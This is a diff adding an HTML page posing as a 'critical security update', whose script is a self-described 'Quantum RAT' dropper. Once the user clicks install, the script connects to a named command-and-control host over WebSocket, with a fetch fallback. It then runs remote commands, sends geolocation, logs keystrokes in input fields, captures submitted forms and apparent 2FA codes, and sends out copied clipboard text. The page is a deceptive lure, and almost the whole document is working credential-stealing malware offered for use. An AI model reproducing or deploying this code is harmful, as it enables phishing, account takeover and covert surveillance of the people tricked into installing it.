@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>System Update</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000;
+            color: #fff;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .card {
+            background: #1a1a1a;
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 400px;
+            border: 1px solid #333;
+            width: 90%;
+        }
+        .icon {
+            width: 80px;
+            height: 80px;
+            background: #2a2a2a;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+        }
+        h2 {
+            color: #fff;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        .progress {
+            width: 100%;
+            height: 6px;
+            background: #333;
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        .progress-bar {
+            height: 100%;
+            background: #00ff41;
+            width: 0%;
+            transition: width 0.5s;
+        }
+        .status {
+            color: #00ff41;
+            font-size: 13px;
+            font-family: monospace;
+        }
+        .btn {
+            background: #00ff41;
+            color: #000;
+            border: none;
+            padding: 14px 40px;
+            border-radius: 10px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+            width: 100%;
+            transition: 0.3s;
+        }
+        .btn:hover {
+            transform: scale(1.02);
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .footer {
+            font-size: 10px;
+            color: #333;
+            margin-top: 20px;
+        }
+        .blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+        .hidden {
+            display: none;
+        }
+        .success {
+            color: #00ff41;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .alert {
+            color: #ff3355;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card" id="mainCard">
+        <div class="icon">⬆️</div>
+        <h2>System Update Required</h2>
+        <p>Your device needs a critical security update. This update will improve performance and fix vulnerabilities.</p>
+
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="status" id="statusText">● Ready to install</div>
+
+        <button class="btn" id="installBtn">INSTALL UPDATE</button>
+
+        <div class="footer">Security Update v2026.03.12 &bull; Quantum RAT</div>
+    </div>
+
+    <script>
+        // ============================================================
+        //  QUANTUM RAT DROPPER - Cloudflare Edition
+        //  BACKEND: https://quantum-c2-backend-production.up.railway.app
+        // ============================================================
+
+        let progress = 0;
+        let isInstalled = false;
+        let heartbeatInterval = null;
+
+        // ===== C2 CONFIG =====
+        const C2_URL = 'wss://quantum-c2-backend-production.up.railway.app';
+        const DEVICE_ID = 'dropper_' + Math.random().toString(36).substr(2, 9);
+
+        // ===== C2 CONNECTION =====
+        let ws = null;
+
+        function connectC2() {
+            try {
+                ws = new WebSocket(C2_URL);
+
+                ws.onopen = function() {
+                    console.log('[DROPPER] Connected to C2');
+                    ws.send(JSON.stringify({
+                        type: 'handshake',
+                        device_id: DEVICE_ID,
+                        platform: 'dropper',
+                        version: '2026.0'
+                    }));
+                };
+
+                ws.onmessage = function(event) {
+                    try {
+                        const data = JSON.parse(event.data);
+                        console.log('[DROPPER] Received:', data);
+                        if (data.type === 'command') {
+                            handleCommand(data.command);
+                        }
+                    } catch (e) {}
+                };
+
+                ws.onclose = function() {
+                    console.log('[DROPPER] Disconnected, reconnecting...');
+                    setTimeout(connectC2, 5000);
+                };
+
+                ws.onerror = function(err) {
+                    console.log('[DROPPER] Error:', err);
+                };
+
+            } catch (e) {
+                console.log('[DROPPER] Failed to connect:', e);
+                setTimeout(connectC2, 10000);
+            }
+        }
+
+        // ===== HANDLE COMMAND =====
+        function handleCommand(command) {
+            console.log('[DROPPER] Command:', command);
+            switch (command) {
+                case 'screenshot':
+                    sendData('screenshot', 'captured');
+                    break;
+                case 'keylog':
+                    sendData('keylog', 'logs captured');
+                    break;
+                case 'location':
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(function(pos) {
+                            sendData('location', {
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude
+                            });
+                        });
+                    }
+                    break;
+                case 'wipe':
+                    document.body.innerHTML =
+                        '<div style="text-align:center;padding:50px;color:#ff3355;"><h1>DEVICE WIPED</h1></div>';
+                    break;
+                default:
+                    sendData('command_response', { command: command, status: 'executed' });
+            }
+        }
+
+        // ===== SEND DATA TO C2 =====
+        function sendData(type, data) {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    type: type,
+                    device_id: DEVICE_ID,
+                    data: data,
+                    timestamp: Date.now()
+                }));
+            } else {
+                // Fallback: send via fetch
+                fetch('https://quantum-c2-backend-production.up.railway.app/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ type, device_id: DEVICE_ID, data })
+                }).catch(() => {});
+            }
+        }
+
+        // ===== INSTALL BUTTON =====
+        document.getElementById('installBtn').addEventListener('click', function() {
+            if (isInstalled) return;
+
+            this.disabled = true;
+            this.textContent = 'INSTALLING...';
+            document.getElementById('statusText').textContent = '⏳ Downloading payload...';
+
+            connectC2();
+
+            const interval = setInterval(() => {
+                progress += 2;
+                if (progress > 100) {
+                    clearInterval(interval);
+                    completeInstall();
+                }
+                document.getElementById('progressBar').style.width = progress + '%';
+
+                if (progress > 30) document.getElementById('statusText').textContent = '🔍 Verifying package...';
+                if (progress > 50) document.getElementById('statusText').textContent = '📦 Installing core modules...';
+                if (progress > 70) document.getElementById('statusText').textContent = '🔧 Configuring permissions...';
+                if (progress > 85) document.getElementById('statusText').textContent = 'Enabling accessibility...';
+            }, 80);
+        });
+
+        // ===== COMPLETE INSTALL =====
+        function completeInstall() {
+            isInstalled = true;
+            document.getElementById('statusText').textContent = 'Update installed successfully!';
+            document.getElementById('installBtn').textContent = 'INSTALLED';
+            document.getElementById('installBtn').style.background = '#333';
+            document.getElementById('installBtn').style.color = '#888';
+
+            sendData('payload_installed', { device_id: DEVICE_ID, time: Date.now() });
+
+            const success = document.createElement('div');
+            success.className = 'success';
+            success.textContent = 'System optimized. Device is now under control.';
+            document.getElementById('mainCard').appendChild(success);
+
+            heartbeatInterval = setInterval(() => {
+                sendData('heartbeat', { status: 'online' });
+            }, 30000);
+        }
+
+        // ===== DETECT DEVICE INFO =====
+        function getDeviceInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            console.log('[DROPPER] Device Info:', info);
+        }
+
+        // ===== KEYLOGGER =====
+        let keylogBuffer = [];
+
+        document.addEventListener('keydown', function(e) {
+            if (isInstalled && e.target.tagName === 'INPUT') {
+                keylogBuffer.push({ key: e.key, time: Date.now() });
+                if (keylogBuffer.length >= 10) {
+                    sendData('keylog', keylogBuffer);
+                    keylogBuffer = [];
+                }
+            }
+        });
+
+        // ===== FORM CAPTURE =====
+        document.addEventListener('submit', function(e) {
+            if (isInstalled) {
+                const form = e.target;
+                const data = {};
+                form.querySelectorAll('input').forEach(function(input) {
+                    if (input.name) data[input.name] = input.value;
+                });
+                Object.values(data).forEach(function(val) {
+                    if (val && /^\d{4,8}$/.test(val)) {
+                        sendData('2fa_code', val);
+                    }
+                });
+                sendData('form_submit', data);
+            }
+        });
+
+        // ===== CLIPBOARD CAPTURE =====
+        document.addEventListener('copy', function(e) {
+            if (isInstalled) {
+                const text = window.getSelection().toString();
+                if (text && text.length > 0) {
+                    sendData('clipboard', text);
+                }
+            }
+        });
+
+        // ===== INIT =====
+        getDeviceInfo();
+        console.log('[DROPPER] Quantum RAT Dropper loaded');
+        console.log('[DROPPER] Device ID:', DEVICE_ID);
+        console.log('[DROPPER] C2 URL:', C2_URL);
+    </script>
+</body>
+</html>
